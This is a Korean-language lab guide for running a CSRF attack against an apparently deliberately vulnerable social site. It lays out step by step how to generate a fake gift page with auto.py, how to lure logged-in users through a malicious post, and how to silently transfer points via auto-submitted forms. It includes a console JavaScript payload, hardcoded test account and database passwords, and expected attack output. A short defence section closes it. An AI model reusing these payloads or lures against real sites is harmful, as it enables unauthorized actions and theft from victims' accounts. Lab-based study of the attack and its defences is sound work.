# CSRF 공격 테스트 가이드

## 중요: CSRF 공격이 작동하는 조건

CSRF 공격은 **피해자가 이미 로그인한 상태**에서만 작동합니다!

### 왜 로그인이 필요한가?

CSRF 공격은 피해자의 **세션 쿠키**를 이용합니다:
- 피해자가 SNS에 로그인 → 브라우저에 세션 쿠키 저장
- fake-gift 페이지에서 폼 제출 → 브라우저가 자동으로 세션 쿠키 포함
- 서버는 피해자의 요청으로 인식 → 포인트 전송 실행

## 정확한 테스트 방법

### 방법 1: 같은 브라우저 사용 (추천)

```bash
# 1단계: auto.py 실행해서 fake-gift.html 생성
python3 auto.py http://52.78.221.104 http://13.158.67.78:5000

# 2단계: 브라우저에서 SNS에 admin으로 로그인
# http://52.78.221.104/login.php
# admin / admin123

# 3단계: **같은 브라우저**의 **새 탭**에서 fake-gift.html 열기
# 방법 A: 파일로 직접 열기
open reports/fake-gift.html

# 방법 B: 웹서버로 제공
cd reports
python3 -m http.server 8000
# 그리고 브라우저에서: http://localhost:8000/fake-gift.html

# 4단계: 브라우저 콘솔(F12) 열어서 확인
# [+] Sending 5000P to alice
# [+] Sending 5000P to bob
# ...

# 5단계: alice 계정 확인
# 새 탭에서 http://52.78.221.104/login.php
# alice / alice2024
# 포인트 확인!
```

### 방법 2: 시크릿 모드로 분리 테스트

```bash
# 탭 1: 일반 모드 - admin 로그인 상태 유지
# http://52.78.221.104 (admin 로그인)

# 탭 2: 일반 모드 - fake-gift 열기
# http://localhost:8000/fake-gift.html

# 탭 3: 시크릿 모드 - alice로 확인
# http://52.78.221.104 (alice 로그인)
```

### 방법 3: 실제 공격 시나리오 (악성 게시물)

```bash
# 1. auto.py 실행 (CSRF 게시물 + fake-gift 생성)
python3 auto.py http://52.78.221.104 http://13.158.67.78:5000

# 2. 공격자 서버 시작 (fake-gift.html 제공)
cd reports
python3 -m http.server 5000

# 3. bob 계정으로 로그인
# http://52.78.221.104/login.php
# bob / bobby123

# 4. 메인 피드에서 악성 게시물 확인
# "🎁 특별 이벤트! 무료 10,000 포인트 받기!"

# 5. 링크 클릭
# → fake-gift 페이지 열림
# → 자동으로 bob의 포인트가 alice에게 전송됨

# 6. alice 계정으로 확인
# 포인트 증가 확인!
```

## 문제 해결

### 문제 1: 포인트가 전송되지 않음

**원인**: 피해자가 로그인하지 않은 상태

**해결**:
1. 브라우저에서 SNS에 먼저 로그인
2. **같은 브라우저의 다른 탭**에서 fake-gift.html 열기
3. 시크릿 모드 사용 안 됨! (쿠키가 공유되지 않음)

### 문제 2: 창이 자동으로 닫히지 않음

**원인**: 브라우저 보안 정책

**해결**:
- JavaScript로 연 창만 JavaScript로 닫을 수 있음
- 사용자가 직접 연 창은 닫을 수 없음
- 대신 원래 사이트로 자동 리다이렉트됨 (2초 후)

**확인**:
```javascript
// 브라우저 콘솔(F12)에서 확인
console.log('창 닫기 시도...');
// 2초 후 index.php로 리다이렉트되는지 확인
```

### 문제 3: CORS 에러

**원인**: 파일로 직접 열면 file:// 프로토콜 사용

**해결**:
```bash
# 간단한 웹서버 실행
cd reports
python3 -m http.server 8000

# 브라우저에서 http://localhost:8000/fake-gift.html 접속
```

## 성공 확인 방법

### 1. 브라우저 콘솔 확인 (F12)
```
[+] Fake Gift Page Configuration:
[+] Target SNS: http://52.78.221.104
[+] Sending 5000P to alice
[+] Sending 5000P to bob
[+] Sending 3000P to alice
...
[+] All CSRF attempts completed
[+] Total forms submitted: 14
```

### 2. 네트워크 탭 확인
- profile.php로 14개 POST 요청 확인
- 각 요청의 Form Data 확인:
  ```
  send_gift: 1
  receiver_id: 2
  gift_type: diamond
  points: 5000
  message: Free Event Gift!
  ```

### 3. alice 계정 확인
```bash
# alice로 로그인
# username: alice
# password: alice2024

# 프로필 페이지 또는 메인 페이지에서 포인트 확인
# 받은 선물 확인
```

### 4. MySQL로 직접 확인 (리버스 쉘)
```bash
mysql -u webuser -p'WebPassw0rd!' vulnerable_sns

SELECT username, points FROM users WHERE username IN ('admin', 'alice', 'bob');

SELECT * FROM gifts ORDER BY created_at DESC LIMIT 20;
```

## 예상 결과

### Before (공격 전)
```
admin: 999999 points
alice: 1200 points
bob: 1200 points
```

### After (공격 후 - admin이 피해자인 경우)
```
admin: 999999 - (5000+3000+2000+1000+500+300+100) * 2 = 976200 points
alice: 1200 + 11900 = 13100 points
bob: 1200 + 11900 = 13100 points
```

## 디버깅 팁

### 콘솔에서 수동 테스트
```javascript
// 브라우저 콘솔에서 직접 실행
const form = document.createElement('form');
form.method = 'POST';
form.action = 'http://52.78.221.104/profile.php';
form.innerHTML = `
    <input type="hidden" name="send_gift" value="1">
    <input type="hidden" name="receiver_id" value="2">
    <input type="hidden" name="gift_type" value="diamond">
    <input type="hidden" name="points" value="100">
    <input type="hidden" name="message" value="Test">
`;
document.body.appendChild(form);
form.submit();

// alice 계정에서 100 포인트 확인
```

### iframe 내용 확인
```javascript
// fake-gift 페이지의 콘솔에서
setTimeout(() => {
    for (let i = 0; i < 14; i++) {
        const iframe = document.getElementById('iframe' + i);
        if (iframe && iframe.contentDocument) {
            console.log('iframe' + i + ':', iframe.contentDocument.body.innerHTML);
        }
    }
}, 10000);
```

## 보안 권장 사항 (방어)

CSRF 공격 방어 방법:

1. **CSRF 토큰 사용**
```php
// 모든 폼에 CSRF 토큰 추가
<input type="hidden" name="csrf_token" value="<?php echo $_SESSION['csrf_token']; ?>">

// 서버에서 검증
if ($_POST['csrf_token'] !== $_SESSION['csrf_token']) {
    die('CSRF 공격 감지!');
}
```

2. **SameSite 쿠키**
```php
session_set_cookie_params([
    'samesite' => 'Strict',
]);
```

3. **Referer 확인**
```php
if (!isset($_SERVER['HTTP_REFERER']) ||
    strpos($_SERVER['HTTP_REFERER'], $_SERVER['HTTP_HOST']) === false) {
    die('잘못된 요청입니다.');
}
```

4. **중요한 작업은 재인증 요구**
```php
// 포인트 전송 시 비밀번호 재확인
if ($_POST['send_gift']) {
    if (!verify_password($_POST['password'])) {
        die('비밀번호가 틀렸습니다.');
    }
}
```
